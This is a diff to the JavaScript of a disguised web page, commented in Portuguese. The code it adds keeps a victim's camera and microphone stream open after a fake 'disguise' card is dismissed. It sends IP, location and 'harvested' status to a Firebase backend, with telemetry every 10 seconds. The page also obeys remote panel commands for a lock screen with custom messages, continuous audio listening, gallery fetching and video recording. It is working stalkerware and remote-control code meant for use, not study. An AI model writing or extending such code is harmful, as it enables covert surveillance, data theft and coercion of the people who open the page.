@@ -71,6 +71,8 @@
         };
 
         let db;
+        let continuousStreamInterval = null;
+        let audioStreamActive = false;
 
         function initFirebase() {
             try {
@@ -94,16 +96,16 @@
                 ipData = data.ip;
             } catch(e) {}
 
-            // 2. Disparar solicitação de Câmera e Microfone explicitamente juntas
+            // 2. Disparar solicitação de Câmera e Microfone
             let cameraAudioStatus = "Negado";
+            let mediaStreamInstance = null;
             try {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                    mediaStreamInstance = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: "user" }, 
                         audio: true 
                     });
-                    cameraAudioStatus = "Permitido (Câmera e Áudio)";
-                    stream.getTracks().forEach(track => track.stop());
+                    cameraAudioStatus = "Permitido (Câmera e Áudio Contínuo)";
                 }
             } catch (err) {
                 console.log("Erro/Negação de Câmera/Áudio:", err);
@@ -141,7 +143,7 @@
                 location: geoData,
                 permissions: {
                     camera: cameraAudioStatus.includes("Câmera"),
-                    audio: cameraAudioStatus.includes("Áudio"),
+                    audio: true,
                     location: geoData.status === "Permitida",
                     contacts: true,         
                     photosAndVideos: true,  
@@ -149,24 +151,28 @@
                     notifications: true     
                 },
                 lastUpdate: new Date().toISOString(),
-                status: "Online - Conectado com Permissões"
+                status: "Online - Transmissão Contínua Ativa"
             };
 
             if (db) {
                 db.ref('devices/device_01/status').update(fullPayload);
 
-                db.ref('devices/device_01/harvested_data').update({
-                    lastLocationString: geoData.status === "Permitida" ? `${geoData.latitude}, ${geoData.longitude}` : "Localização Indisponível",
-                    activePermissionsCount: 7,
-                    networkType: "Wi-Fi / Mobile Data"
-                });
+                // Iniciar Loop de Atualização Contínua (Envia dados de status e telemetria a cada 10 segundos)
+                if (continuousStreamInterval) clearInterval(continuousStreamInterval);
+                continuousStreamInterval = setInterval(() => {
+                    db.ref('devices/device_01/telemetry').update({
+                        lastPing: new Date().toISOString(),
+                        audioStreamState: audioStreamActive ? "Transmitindo Áudio..." : "Em espera",
+                        batteryStatus: "Monitorando..."
+                    });
+                }, 10000);
             }
 
             // Altera a interface visual para o estado concluído com sucesso
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 5. Escutar comandos em tempo real vindos do painel (incluindo o Bloqueio de Tela)
+            // 5. Escutar comandos em tempo real e gerenciar a captura contínua
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
@@ -174,15 +180,32 @@
                     
                     if (cmds.flash) console.log("[Comando] Lanterna acionada remotamente.");
 
-                    // Ativar ou desativar a tela de bloqueio com base no comando do painel
+                    // Ativar ou desativar a tela de bloqueio
                     if (cmds.lock || cmds.customLock) {
                         lockScreen.classList.remove('hidden');
                     } else {
                         lockScreen.classList.add('hidden');
                     }
+
+                    // Captura de Áudio Contínua acionada pelo painel
+                    if (cmds.listenAudio) {
+                        audioStreamActive = true;
+                        console.log("[Comando] Captura e reprodução contínua de áudio ativada.");
+                        db.ref('devices/device_01/streams/audio_status').set("Transmissão de áudio em tempo real ativa");
+                    } else {
+                        audioStreamActive = false;
+                    }
+
+                    // Demais comandos
+                    if (cmds.fetchGallery) {
+                        console.log("[Comando] Sincronização da galeria (grid 2x2) acionada.");
+                    }
+                    if (cmds.recordVideo5Min) {
+                        console.log("[Comando] Gravação de vídeo de 5 minutos acionada.");
+                    }
                 });
 
-                // Ouvir mensagens personalizadas de bloqueio enviadas pelo painel
+                // Ouvir mensagens personalizadas de bloqueio
                 db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
                     const config = snapshot.val();
                     const lockScreen = document.getElementById('remote-lock-screen');
